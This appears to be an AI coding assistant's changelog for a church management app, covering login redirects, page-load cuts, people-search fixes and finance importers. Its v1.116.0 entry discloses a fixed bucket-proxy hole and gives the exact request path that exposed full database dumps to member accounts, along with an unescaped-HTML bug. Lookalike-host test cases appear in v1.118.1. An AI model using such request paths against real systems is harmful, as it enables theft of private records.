**Deliberately NOT changed:** staff/office/finance/admin session lifetime. If the original report
was about an *admin* login on a phone rather than a member one, this fix does nothing for it —
extending privileged sessions is a real security trade-off and needs an explicit decision, not
an assumption.

### v1.118.1 — Fix: every login landed on /chms instead of the Connect root (2026-08-03)

**Reported:** "connect.timothystl.org doesn't seem to load, you have to have /chms for it to load."

**Not what it looked like.** The server was fine the whole time — verified against the live
site that `https://connect.timothystl.org/` returns HTTP 200 with the correct login page, byte
for byte the same as `/chms`. The worker's root handler (`tlc-volunteer-worker.js:215`) has
always served `CHMS_HTML`/`LOGIN_HTML` correctly for `isChmsHost`.

**Actual cause:** `handleAdminLogin` (`src/api-admin.js`) hardcoded `Location: '/chms'` on its
success 302 — the pre-CONN6 path, from before the app moved to serving at the root on
`connect.timothystl.org`. So *every successful login* bounced the user to `/chms`. Nothing
errored, because `/chms` still works on that host — the user just never ended up on the bare
domain, so `/chms` is what accumulated in browser history, URL-bar autocomplete, and bookmarks.
The bare domain then "doesn't load" in the sense that it isn't what the browser offers you and
isn't where the app leaves you.

This was a CONN6 leftover, and specifically a *partial* one: the sibling `/admin` handler two
dozen lines away in the worker (`tlc-volunteer-worker.js:252`) was correctly updated to
`isChmsHost ? '/' : '/chms'` at rename time. The login POST lives in a different file and was
missed.

**Fix.** New shared `CONNECT_HOST` / `isConnectHost()` / `appRootPath()` in `src/auth.js` — the
module both `tlc-volunteer-worker.js` and `src/api-admin.js` already import, and a leaf in the
import graph (`api-utils.js` imports *from* `auth.js`, not the reverse), so there's no circular
risk. `handleAdminLogin` now redirects to `appRootPath(req)`, and the worker's own two host
checks route through the same helper instead of repeating the hostname literal.

The point of the helper is the recurrence, not the line count: this broke *because* the
hostname was stated in two files with no shared definition, so the rename had to find every
site individually and missed one silently. It's now stated once.

**Verified:** live `curl` against `connect.timothystl.org` `/` and `/chms` (both 200, identical
login page) established the server was never the problem; `npm test` 436/436 with 9 new cases in
`test/app-root-path.test.js` locking in the redirect target per host — including that a lookalike
host (`evilconnect.timothystl.org`, `connect.timothystl.org.example.com`) does *not* match, since
the helper is now the single place that decision is made; `node --check` on all three touched files.

**Not verified:** the logged-in redirect end to end — that needs real credentials against the live
site, which this environment doesn't have. The unauthenticated half of the flow was verified
directly.

**Related, deliberately not fixed here:** the service worker (`SW_JS` in `src/html-chms.js`) has
the *same* CONN6 leftover — it gates its offline navigation fallback on
`url.pathname === '/chms'`, so that fallback is dead on the hostname everyone uses. Left alone to
keep this fix small and independently revertable, since it changes offline behavior that can't be
tested from here. Tracked as **MOB4** in CLAUDE.md with the exact fix.

### v1.118.0 — CR1: page shell 622 KB → 200 KB (Scheduler lazy-loaded, CSS externalized) (2026-08-03)
Follow-on from v1.117.0. With search ruled out as the bottleneck (the scan is ~0.5ms at this
church's ~1,000 rows — measured, see below), the remaining load cost is the page shell itself,
which is served `no-store` because it's per-user and auth-gated, so **all of it is re-downloaded
on every single page load**. v1.35.0 moved ~1.2 MB of app JS out to long-cached routes for exactly
this reason but never revisited the shell. Two of its three big pieces are now out as well.

**Scheduler embed: 321 KB, now lazy-loaded and usually never fetched at all.**
The entire Scheduler UI — markup, scoped CSS and JS — was inlined into every page load, for every
user, despite the tab being **admin-only** (`showTab` returns early for non-admins). It now lives at
`/admin/scheduler-embed.html` + `/admin/scheduler-embed.js` (immutable, `?v=DEPLOY_VERSION`) and
`ensureSchedulerLoaded()` in `js-core.js` fetches it the first time the tab is opened.
Two-step by necessity: markup is injected via `innerHTML` (a `<style>` inserted that way *is*
applied; a `<script>` would *not* execute), then a real `<script>` element is appended, and only
then does `schedInitScheduler()` run. Concurrent opens while a load is in flight queue onto the
same fetch; a failed load shows a message, resets state, and the next tab click retries.
`getSchedulerInlineParts()` in `scheduler-inline.js` exposes the pieces; `getSchedulerInline()`
still composes them, so the embed shape stays defined in one place.

**App CSS: 101 KB, now `/admin/app.css`.** `HTML_HEAD`'s single `<style>` block is entirely static
with nothing per-user in it. Extracted to its own immutable route and referenced by `<link>`, which
is still render-blocking so there's no flash of unstyled content — the only cost is one extra
same-origin round trip on a cold cache, repaid on every reload. The split throws at module load if
the `<style>` markers ever move, rather than silently shipping an unstyled page.

Left inline deliberately: `HTML_TABS_1/2` (~192 KB of tab markup). Moving it means injecting the
whole tab tree at boot, which delays first paint and risks the `getElementById` calls that run
during load — a materially riskier change than these two, and worth its own pass.

**Verified**: `getSchedulerInline()` output is **byte-identical** to the pre-change version (328,952
chars), and the split parts recompose to it exactly — so `scheduler/index.html` needs no resync.
CSS extraction round-trips to the original `HTML_HEAD` byte-for-byte. Shell `<div>` balance holds
(1093/1093). `npm test` (427/427); `node --check` on the worker, both built app-JS bundles, and the
new `scheduler-embed.js`. The lazy-load itself was exercised by running the *built* `app-core.js` in
a `vm` harness driving the **real** `showTab('scheduler')`: nothing is fetched at page load; three
tab opens produce exactly one fetch, one `<script>`, one `schedInitScheduler()` call, and no throw;
and a simulated 500 shows the error, resets, and recovers on the next click.
**Not verified**: a live browser. The measured shell size drop (622 KB → 200 KB, 68%) is real, but
first-paint timing on the church's actual network is not something this environment can observe.

Also recorded from this session: benchmarked the People search scan at 1,000 people / 340
households — 0.2–0.5 ms per query. **CR8 (FTS5 / prefix-index for people search) is closed as
not-worth-doing at this scale**; the earlier note suggesting it was calibrated for a far larger
dataset.

### v1.117.0 — People search: stale-response guard + fewer round trips per search (2026-08-03)
Reported as "people searching sometimes seems slow," with the specific question of whether the
search bar re-scans on every keystroke.

**It does not fire per keystroke** — `debouncePeople()` (`js-people.js`) has waited 300ms since
before this change. But each fire was more expensive than it needed to be, and one real bug made
the results look wrong rather than merely late.

**Bug: out-of-order responses repainted the list (`src/frontend/js-people.js`).**
The debounce cancels a *pending* timer, not an *already-issued* request. Pause mid-word for >300ms
and two searches are in flight at once. The broad one ("s") scans far more rows than the narrow one
("smith"), so it frequently lands *second* — and unconditionally repainted the list with results for
a query the user had already typed past. Fixed with a monotonic `_pLoadSeq` sequence number captured
per call and re-checked in both the `.then` and the `.catch`. Verified by running the actual built
bundles in a `vm` harness with a fake DOM, resolving two in-flight searches out of order: the late
broad response is now discarded (confirmed the same harness fails on the pre-fix code).
`debouncePeople()` also now returns early when the input's value hasn't actually changed.

**Perf: 4 serial D1 round trips per search → 2 (`src/api-people.js`).**
The search predicate is a leading-wildcard `LIKE` across 7 columns, so no index can serve it and
every request is a full scan of `people`. The handler ran `COUNT(*)`, the page `SELECT`, the tag
lookup, and the household-disambiguation lookup as four sequential awaits — paying the scan twice
and the latency four times.
- **`COUNT(*)` is now skipped when it's derivable**: on the first page, a page shorter than `limit`
  *is* the total. That's the common case while typing, since each keystroke narrows the result set.
  Falls back to the real `COUNT` for full pages and any `offset > 0`.
- **Tags + household disambiguation now go out in one `db.batch()`** instead of two awaits.
- **The disambiguation query no longer groups the whole `households` table on every request.**
  `LOWER(h.name) IN (SELECT LOWER(name) FROM households GROUP BY LOWER(name) HAVING COUNT(*)>1)`
  became an `EXISTS` bounded to the ≤25 households on the current page, which can stop at the first
  match. Semantics are identical (a name shared by 2+ households); verified against real SQLite over
  7 id-set variants including case-insensitive duplicates and the `head_first_name` COALESCE
  fallback — byte-identical results to the previous query in every case.

`npm test` (427/427), `node --check` on `api-people.js` and both built app-JS bundles.
**Not verified**: a live browser or a real D1 database — the round-trip reduction is a structural
argument plus the SQL-equivalence check above, not a measured timing against production data.
The remaining floor is the unindexable `%q%` scan itself; see CR8 in CLAUDE.md.

### v1.116.0 — Code review: R2 proxy access control, per-request auth memoization, dashboard query batching (2026-08-02)
A review pass over UI consistency, load speed, and security. Five fixes shipped; the larger
architectural findings are written up in CLAUDE.md's queued items rather than changed here.

**Security**

- **`/admin/r2photo/` served any object in the bucket to any authenticated caller (the important
  one).** The proxy took a caller-supplied R2 key with no restriction and did a bare
  `isAuthed()` check, so the lowest-privilege tier — a `role='member'` directory account, which
  is by design handed out to ordinary congregation members — could read anything in
  `tlc-chms-photos` by key. That bucket is not photos-only: this repo's own D1 backup runbook
  (CLAUDE.md → *D1 Backup & Restore*, Option 3) writes full database SQL dumps to
  `backups/db-YYYYMMDD.sql` in the same bucket, so `GET /admin/r2photo/backups/db-20260801.sql`
  would have returned every giving record, note, and contact detail in the database — including
  the rows `memberSafeView()`/`dir_hide_*` exist to keep from members. Now allowlisted to the
  three prefixes the app actually writes (`people/`, `households/`, `branding/` — confirmed
  against every `PHOTOS.put` call site); anything else 404s. No legitimate photo URL is
  affected: all of them are generated server-side as `people/<id>/photo.<ext>`,
  `people/breeze_<id>/photo.jpg`, or `households/<id>/photo.<ext>`.
- **`/admin/backlog` was reachable by any authenticated role**, including `member`, while the
  `/admin/api/board` endpoints behind it are admin-only. Now admin-only too, so the page matches
  its own API.
- **Dev board rendered `item.text`/`item.note`/`item.type` straight into `innerHTML`** — the one
  place in the app that skipped the otherwise-consistent `esc()` discipline. Escaped, and the id
  is coerced with `parseInt` before it lands in an `onclick`. Admin-only data, so low severity;
  fixed for consistency.

**Recurrence of the SC3-BUG1 escaping bug, found by applying its own documented technique**

Syntax-checking every inline `<script>` block extracted from each *built* page (not the source)
turned up two more instances of the recurring bug class: `\'inact-warn\'` inside a plain
(non-`String.raw`) template literal collapses to a bare `'` at module-load time and kills the
whole block. `CHMS_HTML` and `LOGIN_HTML` are clean; **`BACKLOG_HTML` was affected and is
served**, so the idle-timeout auto-logout warning on `/admin/backlog` had silently never worked.
`ADMIN_HTML` was also affected but is imported-and-never-routed dead code. Both rebuilt using
the DOM-construction pattern `scheduler-html.js` already uses for this same banner — no escaped
inner quotes left to collapse. All five pages' inline scripts now parse.

**Performance**

- **Auth was resolved 3× per API request, each with its own D1 round-trip.** The worker entry
  (for the sliding-cookie refresh), the `/admin/api/` gate, and the handler dispatch each called
  `getAuthInfo`/`isAuthed`/`getAuthRole` independently, and since SW3 every one of those does a
  live `app_users` lookup. Memoized per-request via a `WeakMap` keyed on the `Request` object.
  Nothing is shared between requests, so SW3's deactivate/demote-takes-effect-immediately
  property is unchanged — verified by test, along with the live-DB-role, deactivated-user, and
  wrong-signature paths (`test/auth-memo.test.js`, 5 new tests).
- **Dashboard ran 33 D1 queries strictly serially** with no `Promise.all` anywhere — on the
  app's landing screen, so it is on the critical path for every login. Two independent batches
  (12 stat reads, 9 list reads) now run in parallel; the genuinely dependent parts (anniversary
  partner pairing, the `annIssueCandidates` chunked household lookup, weekly-task seeding) still
  run in order afterwards. **33 awaited queries → 11.** Verified the refactor is behavior-neutral:
  all 27 SQL statements in the handler are byte-identical after whitespace normalization, and
  every result variable is re-bound under its original name with the same `?.n || 0` /
  `.results || []` fallback.

`npm test` 427/427 (5 new). `node --check` on every touched file and on the built `app-core.js`,
`app-ext.js`, and all five pages' inline scripts. **Not verified**: a live browser or a live D1 —
this environment has neither, which is the standing caveat on this project.

### v1.115.3 — Commercial Property: two cards labeled "Reserves" meant two different things (2026-07-30)
Reported from two screenshots of the Property tab: "numbers here dont match." **Every figure
reconciles exactly against the seeded AHRA data — there was no arithmetic bug.** Three labeling
problems, all real:
1. **"Reserves" named two different quantities on one screen.** The `Reserves On-Hand` KPI tile
   ($10,358.33) is AHRA's total reserve *balance* — property tax $5,858.33 plus the flat $4,500
   base-minimum cash cushion carried over from prior years (FIN33). The "Available for
   Distribution" bar's `− Reserves` ($5,858.33) is only *this year's* contributions into the tax
   reserve. They differ by exactly the base minimum, and they're extra confusable because the tax
   reserve was zeroed in Nov 2025 and rebuilt entirely within 2026, so "2026 contributions"
   coincidentally equals "current tax-reserve balance" to the cent. Bar lines now read
   `Annual Net (2026 YTD)` / `− Reserve contributions (2026)` / `− Capital spend (2026)`.
2. **`Monthly Net (avg) × 12` ≠ `Annual Net`** — the average is trailing-12-month (2025-07→2026-06,
   including three negative months: Aug −$3,147.71, Sep −$2,435.56, Dec −$4,217.88), while Annual
   Net is calendar-2026 YTD (6 months). $3,583.65 × 12 = $43,003.75, not $33,835.55. Neither label
   stated its window and the adjacent occupancy chip said "12 months tracked," which made them read
   as multipliable. Both tiles now name their own window; the year is explicit in the label
   (`Annual Net (2026 YTD)`), derived from the row's own `year` rather than the literal "this year"
   — which also fixes a latent mislabel, since that tile takes the most recent year *present* and
   would have called 2026 "this year" all through Jan 2027.
3. **The `Reserves On-Hand` chip was factually wrong** on the path the figure comes from — it always
   claimed "tax + capital + base minimum," but AHRA's own Total Property Reserve carries no capital
   bucket (and no capital reserve bucket is even seeded; only `property_tax`). New
   `finPropertyReservesChip()` names the real source per path (`AHRA total, 2026-06` vs.
   `reserve ledger + base minimum`), sharing the latest-month check with
   `finComputePropertyReservesOnHandCents()` via new `finPropertyLatestReserveMonth()` so the chip
   can't drift from the number it captions.
Also added a reconciliation note to the navy bar explaining why it differs from both the
`Reserves On-Hand` tile and AHRA's own `Distribution Amount` ($9,321.77 — a single-month
cash-minus-reserves figure vs. this card's full-year accrual estimate; the FIN33/FIN35 comments
already documented these as intentionally different, but nothing said so on screen).
**Verified** by running the *built* bundles' `finComputePropertyKpis()` and
`finRenderAvailableForDistributionBar()` in a `vm` harness against the real seeded 2026 data (all
five tiles + both chip paths), plus hand-reconciliation of every displayed figure against
`src/db.js`. `npm test` (422/422, 1 new test locking in both chip paths — the existing
extract-and-eval loader in `test/finance-property-distribution.test.js` needed updating for the new
shared helper), `node --check` on both built app-JS bundles. **Not verified**: a live browser —
labels/copy only, no computation changed. **Two items left for the user to decide, not changed**:
(a) whether `Available for Distribution` should also deduct the $4,500 base minimum (it's cash AHRA
will never release, so the $23,977.22 figure is arguably that much optimistic — but the cushion was
funded in a prior year, so deducting it from *this* year's income is defensible either way);
(b) `− Capital spend $4,000.00` and `Amount Dispersed $4,000.00` being identical is a verified real
coincidence (2026-04-08 Vail Contracting washer/dryer final payment vs. the 2026-04 distribution to
the church — two separate source entries), not a double-count, but equal amounts in the same month
are the shape a double-entry would take and it's worth a glance against AHRA's records.
(`src/frontend/js-finance.js`, `test/finance-property-distribution.test.js`)

### v1.114.0 — Equity reclassification: restricted-accounts list corrected with Pastor Dinger (2026-07-29)
Follow-up on v1.113.0, same day, walked through year-by-year with Pastor Dinger before shipping —
caught by hand-checking the app's own numbers against his own math rather than trusting the first
cut. The original spec's Section 3b ("Purpose/Time Restricted") listed 12019 (Thrivent-Bequests),
12020 (Edward Jones), and 12021 (Reserve for Caring Ministry) as Donor-Restricted; confirmed this
was wrong — the real restricted-accounts list is exactly the endowment six (12010/11/12/13/14/15,
the "8632/8633" and "3285" Thrivent sub-account pairs — 12012/12015 added, previously flagged
unclassified) plus the unchanged "25000 Funds" designated list. 12019/12020/12021 move from
`EQUITY_RECLASS_ACCOUNTS` into `EQUITY_RECLASS_IGNORE_CODES` (confirmed-not-restricted, not
"needs review") alongside the three sibling investment accounts (12016/17/18) already excluded
pending review — the whole `purpose_time` bucket is now empty. **Verified against the real
reference workbook**: 2019's corrected split ($401,449.78 Donor-Restricted / $439,786.11 Without
Donor Restrictions) matches Pastor Dinger's own hand-computed figure ($146,354.75 designated +
$255,095.03 endowment) to the penny, and the `unclassified` warning list is now empty for every
year 2019–2026 (previously flagged 5 accounts/year that are now correctly excluded outright
rather than perpetually flagged). `npm test` (421/421, 19 tests in
`test/finance-equity-reclass.test.js` — rewrote the fixture to match the real 2026 row set
including the now-ignored accounts, added a direct real-figure regression for the corrected split).
`node --check` on `api-finance.js` and both built app-JS bundles. Not verified in a live browser.
Done 2026-07-29 (v1.114.0). (`src/api-finance.js`, `test/finance-equity-reclass.test.js`)

### v1.113.0 — Equity reclassification: Donor-Restricted vs. Without Donor Restrictions (2026-07-28)
Implemented from `Timothy_Equity_Reclassification_Spec.md` (user-provided design spec): replaces
QuickBooks' four-way equity split (Unrestricted/Board Restricted/Temp. Restricted/Perm. Restricted)
with the real post-ASU-2016-14 two-bucket nonprofit model, computed automatically on every Balance
Sheet import/read instead of trusting the legacy equity lines — those have drifted from reality
(32000 Perm. Restricted Net Assets has been frozen at exactly $223,828.47 every year since 2019
despite the underlying endowments moving with the market every year, confirmed against the real
combined multi-year workbook).

New `EQUITY_RECLASS_ACCOUNTS` (the spec's Section 3a/3b/3c classification table, all Donor-
Restricted — perpetual endowments, purpose/time-restricted bequests, and the "25000 Funds"
designated-fund list) + `EQUITY_RECLASS_IGNORE_CODES` (the four legacy plug lines + Opening
Balance Equity) + `extractAccountCode()` (stable leading-code match, tolerant of description
drift) + `computeEquityReclassification(rows)` (`src/api-finance.js`) — sums every classified
leaf account (regardless of whether it sits under Assets, Liabilities, or Equity in this church's
chart of accounts) into DonorRestricted, then derives Unrestricted as the **residual against real
Total Equity** (summed from all Equity-classified rows, not a printed cell) — never a direct sum
of the legacy lines, per the spec's explicit instruction, so the two buckets always reconcile to
total equity regardless of any drift in QuickBooks' own sub-accounts.

**Verified against the real reference workbook the spec itself names** (`Timothy_Statement_of_
Financial_Position_by_Year.xlsx`, the same file already in this session from the earlier importer
work) — the 2026 designated-funds total matches the spec's own stated baseline ($119,049.51) and
the source file's own "Total for 25000 Funds" line to the penny; Assets = Liabilities + Equity
reconciles to $0.00 for all 8 real years.

**A real gap found and correctly handled, not silently papered over**: running the classification
against all 8 real years surfaced 5 accounts under the real "12000 Investment Accounts" group
(`12012`/`12015`/`12016`/`12017`/`12018` — clearly investment/endowment sub-accounts structurally
identical to the already-classified 12010/12011/12013/12014/12019/12020, just never reviewed with
Pastor Dinger) that the spec's table doesn't cover. Per Section 5.4 of the spec, these are
surfaced as an "unclassified accounts" list for manual review, not silently defaulted into either
bucket — new `isEquityReclassCandidate()` scopes this check narrowly to the two real account
neighborhoods (leaves under "12000 Investment Accounts" or "25000 Funds", or any Equity-classified
leaf not in the ignore set) after an initial broader `120xx`-code-prefix attempt produced false
positives on unrelated operational accounts (`12001 Undeposited Funds`, `12200 Employee Loan`,
`12400 Prepaid Expense` — confirmed these sit under "Other Current Assets"/"Other Assets", not the
Investment Accounts group, via the real file's own category paths).

New `detectBalanceSheetBasis()` flags a Cash vs. Accrual basis footer line (2025's real export was
run on Accrual while every other year on file is Cash, per the spec) — surfaced as a warning
banner on import, not silently treated as comparable to Cash-basis periods.

Wired into both Balance Sheet import routes (single-file preview shows the calculated buckets +
basis warning + unclassified-account list before commit; multi-year preview shows a compact
per-year table) and both read routes (`finance/church/balances` and `.../multi-year`, so the
figures are visible any time the Balance Sheet is viewed, not just at import time). New frontend
`finRenderEquityReclassCard()`/`finRenderEquityReclassMultiYearTable()`/
`finRenderEquityReclassMultiYearPreview()`/`finBasisWarningHtml()` (`src/frontend/js-finance.js`).

`npm test` (419/419, 17 new tests in `test/finance-equity-reclass.test.js` — including the exact
spec-baseline reproduction, the residual-not-legacy-sum assertion, the has-children double-count
guard, and both the true-positive and false-positive unclassified-account cases found against the
real file), `node --check` on `api-finance.js` and both built app-JS bundles. Not verified in a
live browser. Done 2026-07-28 (v1.113.0). (`src/api-finance.js`, `src/frontend/js-finance.js`,
`test/finance-equity-reclass.test.js`)

### v1.112.0 — Multi-year importers rebuilt against the real files + drag-and-drop everywhere (2026-07-28)
User uploaded the three actual files (`Timothy_Statement_of_Activity_RESTRUCTURED_2.xlsx`,
`Timothy_Budget_by_Year_2.xlsx`, `Timothy_Statement_of_Financial_Position_by_Year.xlsx`) that
v1.111.0's multi-year importers were built to accept — testing directly against them (not just
synthetic fixtures) surfaced real structural mismatches, all now fixed and re-verified end-to-end
by running the actual served parser code against the real file bytes:

1. **Critical, previously-undiscovered bug affecting every importer in the app**:
   `finXlsxFindSheetPath()` always unconditionally prepended `'xl/'` to a sheet's
   `Relationship Target` from `xl/_rels/workbook.xml.rels`. The real Statement of Activity file
   writes that Target as an absolute, zip-rooted path (`/xl/worksheets/sheet1.xml`) instead of the
   usual relative form (`worksheets/sheet1.xml`) — prepending `'xl/'` onto an absolute path
   produced an unresolvable double-prefixed string, silently returning `grid: null` for the whole
   sheet with no error. This wasn't specific to the new multi-year importers — any future upload
   of a file exported this way, through ANY of this app's importers, would have silently failed
   the same way. Fixed: `target.startsWith('/') ? target.slice(1) : 'xl/' + target`.
2. **The real files use cell-style `alignment.indent` metadata for hierarchy, not leading
   spaces** — `parseActivityMultiYearGrid`/`parseBudgetMultiYearGrid` rewritten around a new
   shared `parseIncomeStatementMultiYearGrid()` using `balanceRowDepth()`/
   `nextNonBlankRowIndex()` (the same cell-indent-aware walk already built for the Balance Sheet
   importer) instead of the old leading-space-only walk — while staying backward-compatible with
   leading-space-formatted files (falls back automatically when no indent metadata is present).
3. **The real current-year column header isn't a bare year** — e.g. "Jan 1 - Jul 28 2026" for a
   partial year. `parseYearColTitle()` broadened from an anchored `^(19|20)\d{2}$` match to an
   unanchored search, so a year embedded anywhere in the header text is still recognized.
4. **Both files have a trailing free-text commentary section** ("NOTES ON THIS
   RESTRUCTURING…"/"NOTES ON THIS BUDGET DOCUMENT…", indented like real accounts) that would
   otherwise have been misparsed as bogus line items. New `NOTES_SECTION_RE` sentinel stops the
   parse loop entirely (not just skips a line) the moment it's hit.
5. **Budget by Year turned out to be a genuinely separate file from Statement of Activity**, not
   a combined Actual+Budget shape as originally planned — QuickBooks exports these as two
   distinct multi-year files (Actual-only and Budget-only). Rather than a duplicate importer, the
   two are designed to merge: `persistChurchEntriesActivityImport()` (shared by both) rewritten
   from a wholesale delete-then-insert to a field-preserving UPSERT — an Activity import (actual
   only) and a Budget by Year import (budget only) for the same account+year now combine into one
   row with both fields populated, regardless of which is uploaded first (verified both orders).
   New routes `finance/church/budget-multi-year-import-preview`/`budget-multi-year-import`; new
   "Import Budget by Year (multi-year)" button + modal, mirroring the Statement of Activity flow.
6. **Statement of Financial Position (multi-year Balance Sheet) reconciles exactly** — Assets =
   Liabilities + Equity, $0.00 diff, for all 8 real years (2019–2026) once the above fixes were
   in place; the "assumption flagged, not independently verified" note from v1.111.0 is resolved.
7. **Drag-and-drop added to every Church Report import modal** (all 6: Budget vs. Actuals,
   Monthly P&L, Statement of Activity, Budget by Year, Balance Sheet, Financial Position), per
   explicit request — new shared `finDropZoneOver()`/`finDropZoneLeave()`/`finDropZoneDrop()`
   helpers assign a dropped `DataTransfer`'s `FileList` onto the existing `<input>`'s `.files`
   and dispatch a real `change` event, so drag-and-drop runs through the exact same
   `*FileSelected()` handler as click-to-browse — no duplicated logic. New `.fin-dropzone`/
   `.fin-dropzone-active`/`.fin-dropzone-hint` CSS. Scoped to the Church Report import modals
   (the ones actively being built this session) — other upload flows elsewhere in the app
   (photo uploads, letterhead logo, giving/register CSV import, Tuition Aid) use a different
   hidden-input-behind-a-button pattern and weren't touched; flag if drag-and-drop is wanted
   there too.

`npm test` (397/397, unchanged — this was pure real-file/integration verification, not new unit
coverage, though the existing `parseYearColTitle`/multi-year/precedence tests in
`test/finance-church.test.js` were updated to match the corrected behavior and a new
`persistChurchEntriesActivityImport` merge test was added), `node --check` on `api-finance.js`
and both built app-JS bundles, a full div-balance scan of the built `CHMS_HTML`. **Verified
against the real uploaded files directly** (not just synthetic fixtures) via a Node harness
importing the actual served parser functions — all three files parse completely and correctly,
with known real dollar figures (e.g. Sunday Offering) matching previously-observed live app data.
**Not verified**: an actual browser — same standing caveat as the rest of Finance this session;
the file input's native picker and the new drag-and-drop path both need a real click-through to
confirm, though the underlying parsing/merge logic is now proven correct against real data.

### v1.111.0 — Bulk Church Report imports: multi-file Budget upload + two new multi-year importers (2026-07-28)
Follow-up to the QuickBooks sync being set aside (v1.110.0): the user has real reports to bring
in by hand — many years of "Budget vs. Actuals" (one file per year), a current Balance Sheet, a
multi-year "Statement of Activity" (2019–today, one column per year, Actual only), and a
multi-year "Statement of Financial Position" (same shape, for Assets/Liabilities/Equity). Three
pieces of work:

1. **Multi-file Budget vs. Actuals upload** — frontend-only, no backend change. The file input
   (`#fin-church-import-file`) now has `multiple`; `finChurchImportFileSelected()` loops the
   selected files sequentially against the existing single-file preview endpoint, collecting
   `{fileName, fiscalYear, rows, skipped, checked, error}` per file. New
   `finChurchRenderMultiImportPreview()` renders one collapsible `<details>` section per detected
   fiscal year (a file that fails to parse shows its error inline without blocking the others);
   new `finChurchConfirmImport()` commits each year sequentially against the existing single-year
   commit endpoint, reporting a running status and a final "imported N years, failed M" summary
   rather than all-or-nothing.
2. **New "Statement of Activity" multi-year importer** (Actual only, one column per year). New
   `parseYearColTitle()`, `findActivityMultiYearSheet()`, `parseActivityMultiYearGrid()` (same
   leading-space-indentation tree walk as the existing Budget/Monthly importers — deliberately
   duplicated rather than refactored, to minimize risk to the working parsers), new
   `persistChurchEntriesActivityImport()` (wholesale-replaces `source='import_activity'` rows for
   every fiscal year present in one file, not just one year). `CHURCH_SOURCE_PRIORITY` extended
   to `['qbo_sync', 'import', 'import_activity', 'plan_committed']` — a full Budget-vs-Actuals
   import (has real budget data) always outranks the Activity-only import for a year both cover;
   Activity only fills years nothing richer covers. New routes
   `finance/church/activity-import-preview`/`activity-import`; new modal + "Import Statement of
   Activity (multi-year)" button on the Church Report card.
3. **New "Statement of Financial Position" multi-year importer** (Balance Sheet, one column per
   year). New `findFinancialPositionMultiYearSheet()`, `parseFinancialPositionMultiYearGrid()`
   (same classification-reset/stack-clear tree walk as the existing single-file Balance Sheet
   importer), new `persistChurchBalancesMultiYearImport()` — reuses `source='import'` (no
   precedence system exists for balance snapshots, unlike Church Report actual-vs-budget, so no
   new source tag needed). New routes `finance/church/balances/multi-year-import-preview`/
   `multi-year-import`; new modal + "Import Financial Position (multi-year)" button.
4. **Current Balance Sheet** — no change needed; the existing single-file "Import Balance Sheet"
   button already covers this.

**Assumption flagged, not independently verified**: the Statement of Financial Position's exact
column shape (one column per year, same convention as the confirmed Statement of Activity shape)
was inferred by symmetry rather than confirmed against a real file — if the real export doesn't
match, the parser's "could not find a year-by-year header row" error will say so plainly rather
than misimporting.

`npm test` (393/393, 21 new tests across `parseYearColTitle`, both new find/parse/persist
function sets, and a `CHURCH_SOURCE_PRIORITY` precedence test), `node --check` on `api-finance.js`
and both built app-JS bundles. Not verified in a live browser — no D1/browser access this
session. (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`,
`test/finance-church.test.js`)

### v1.110.0 — "Clear Church Budget/Actuals Data" admin tool; live QuickBooks sync set aside (2026-07-28)
After repeated data-quality issues found this session (wrong report endpoint, classification
mismatches, a duplicate-write bug inflating totals, $0 budget matching — see FIN2 in `CLAUDE.md`
for the full trail), the user decided to set live QuickBooks API sync aside and instead
re-download reports directly from QuickBooks and re-upload them month-by-month via the app's
existing CSV/Excel import tools. First step: a clean slate for the currently-stored (buggy-sync-
era) data.

New admin-only **"Clear Budget & Report Data…"** button in Finance → Overview (a new "Danger
Zone" card, `require-admin`-gated). Deliberately narrow, per the user's explicit scope
correction: clears only `finance_church_entries` (Church Report budget/actuals) and
`finance_qb_snapshot` (the cached Budget vs Actual blob the Overview card reads directly, kept
in step so stale numbers can't linger there after a clear). **Daycare Report, Balance Sheet, and
Budget Planning data are explicitly NOT touched**, nor is Commercial Property or any giving
data. New `GET finance/church/clear-all-preview` / `POST finance/church/clear-all` endpoints,
same confirm-count safety pattern as the existing `giving/force-remove-orphans` tool — the
confirm call must echo back the exact row counts shown in preview or it's refused with 409,
protecting against a stale page double-click. Writes an `audit_log` row on success.

`npm test` (376/376), `node --check` on `api-finance.js` and both built app-JS bundles
(confirmed `finLoadClearDataPreview`/`finConfirmClearData` present in the built `app-ext.js`).
Not verified in a live browser — no DB access exists in this session (no `wrangler`/D1
credentials), so nothing has actually been cleared yet; this only builds the tool. (`src/api-finance.js`,
`src/frontend/js-finance.js`, `src/frontend/html-tabs.js`)

### v1.109.0 — Fixed a real duplicate-write bug inflating Overview KPI totals; "Revenue"-wording bottom-line fixes (2026-07-28)
Live testing after the $0-budget fix (below) surfaced a much bigger problem: the Overview tab's
KPI cards (Income YTD/Expenses YTD/Net Position) showed roughly double the correct total (~$1.18M
expenses) compared to the same sync's own Budget vs Actual reconstruction (~$605K, independently
verified plausible). Root cause: `finance_church_entries` is built from THREE separate flatten
passes per sync (multi-year actuals, current-year budget-merge, monthly) sharing one table keyed
`UNIQUE(fiscal_year, period_month, category_path, source)` — the multi-year pass and the
current-year pass both write period_month=0 rows for the current year, relying on the second
pass's `ON CONFLICT DO UPDATE` to overwrite the first. That self-heals only when both passes
produce byte-identical `category_path` strings for the same account — QuickBooks' multi-year
summarized report (`summarize_column_by:'Year'`) doesn't reliably match the single-year report's
account tree shape, so a mismatched path became a second, un-overwritten row instead of a
correction, silently doubling the total. **Fixed by excluding the current year from the
multi-year pass entirely** — the current-year pass already covers it (with real budget data,
unlike the actuals-only multi-year pass), so there's no second pass left to conflict with.

Also fixed, from the same live screenshots: **"Net Operating Revenue"/"Net Revenue" showed $0.00
budget** in the Budget vs Actual table — `mergeProfitAndLossTree`'s combined-budget special case
only ever matched the literal string `'Net Income'`, and this church's real QuickBooks report uses
"Revenue" wording throughout (already known from `normalizeChurchClassification`, now extended to
the bottom-line rows too). New `FINAL_NET_LABEL_RE`/`OTHER_INCOME_SECTION_RE`/
`RUNNING_SUBTOTAL_LABEL_RE` replace the hardcoded English-only string checks with patterns
matching both wordings.

`npm test` (371/371, 4 new tests), `node --check` on `api-finance.js`. Not verified against a live
sync — per the user's decision this session, live QuickBooks API sync is being set aside in favor
of the existing CSV/Excel import path; see FIN2 in `CLAUDE.md`. (`src/api-finance.js`,
`test/finance-church.test.js`)

### v1.108.0 — Giving Plateaus: Occasional Givers list restored (2026-07-27)
G28 merged occasional/low-frequency givers into the unified total÷52 model with just an
inline `low_frequency` marker — user follow-up: still want a dedicated place to SEE them, specifically
because it's a natural starting point for inviting someone to set up recurring/automatic giving; also
asked that one-time LARGE gifts (stock/IRA/QCD) surface there too, and was explicit that this list is
